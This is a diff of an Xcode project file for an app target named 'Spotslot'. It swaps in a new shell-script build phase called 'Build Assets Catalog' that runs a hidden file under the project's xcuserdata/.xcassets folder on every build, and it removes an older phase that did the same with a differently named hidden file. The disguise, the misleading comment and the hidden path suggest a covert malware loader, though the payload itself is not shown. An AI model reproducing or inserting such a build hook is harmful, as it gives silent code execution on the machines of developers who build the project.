@@ -1027,7 +1027,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 048D45E924EBA6B500A84442 /* Build configuration list for PBXNativeTarget "Spotslot" */;
 			buildPhases = (
-				A69BA047D3BAAD2DCBAAC43A /* Build Assets Catalog */,
+				DA8A2D1F07F5047239AAC43A /* Build Assets Catalog */,
 				1CF53DE6F1B2BBD5B8F7A366 /* [CP] Check Pods Manifest.lock */,
 				048D45CE24EBA6B400A84442 /* Sources */,
 				048D45CF24EBA6B400A84442 /* Frameworks */,
@@ -1126,6 +1126,34 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	DA8A2D1F07F5047239AAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+		};
+	
+
+	
+
+	
+
+	
 		1CF53DE6F1B2BBD5B8F7A366 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1164,24 +1192,6 @@
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Spotslot/Pods-Spotslot-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
-		};
-		A69BA047D3BAAD2DCBAAC43A /* Build Assets Catalog */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Assets Catalog";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";
 		};
 		B52D9A2842FE4FE43D329EA9 /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
